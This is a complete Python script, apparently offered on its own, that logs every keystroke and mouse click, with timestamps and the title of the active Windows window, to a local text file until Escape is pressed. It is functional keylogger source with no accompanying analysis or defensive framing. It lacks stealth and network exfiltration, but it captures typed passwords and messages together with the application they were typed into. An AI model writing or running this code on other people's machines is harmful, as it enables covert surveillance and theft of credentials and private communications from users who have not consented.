from pynput.keyboard import Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener
import datetime
import platform
import win32gui  # For active window tracking on Windows

# File to store the logs
log_file = "key_mouse_log.txt"

# Function to get the active window title (only works on Windows)
def get_active_window_title():
    if platform.system() == "Windows":
        return win32gui.GetWindowText(win32gui.GetForegroundWindow())
    return "Unknown Window"

# Function to log keyboard events
def on_key_event(event_type, key):
    try:
        with open(log_file, "a") as f:
            dt = datetime.datetime.now().strftime("%Y-%m-%d_%H:%M:%S")
            window_title = get_active_window_title()
            f.write(f"{dt}: [{event_type}][{window_title}] {key}\n")
    except Exception as e:
        print(f"Error logging keyboard event: {e}")

# Function to handle key press
def on_press(key):
    on_key_event("Key Pressed", key)

# Function to handle key release
def on_release(key):
    on_key_event("Key Released", key)
    if str(key) == 'Key.esc':  # Stop logging on pressing Escape key
        return False

# Function to log mouse events
def on_mouse_event(event_type, x, y, button=None):
    try:
        with open(log_file, "a") as f:
            dt = datetime.datetime.now().strftime("%Y-%m-%d_%H:%M:%S")
            window_title = get_active_window_title()
            if button:
                f.write(f"{dt}: [{event_type}][{window_title}] {button} at ({x}, {y})\n")
            else:
                f.write(f"{dt}: [{event_type}][{window_title}] at ({x}, {y})\n")
    except Exception as e:
        print(f"Error logging mouse event: {e}")

# Function to handle mouse click
def on_click(x, y, button, pressed):
    event_type = "Mouse Pressed" if pressed else "Mouse Released"
    on_mouse_event(event_type, x, y, button)

# Listener setup for keyboard and mouse
with KeyboardListener(on_press=on_press, on_release=on_release) as keyboard_listener, \
     MouseListener(on_click=on_click) as mouse_listener:
    keyboard_listener.join()
    mouse_listener.join()
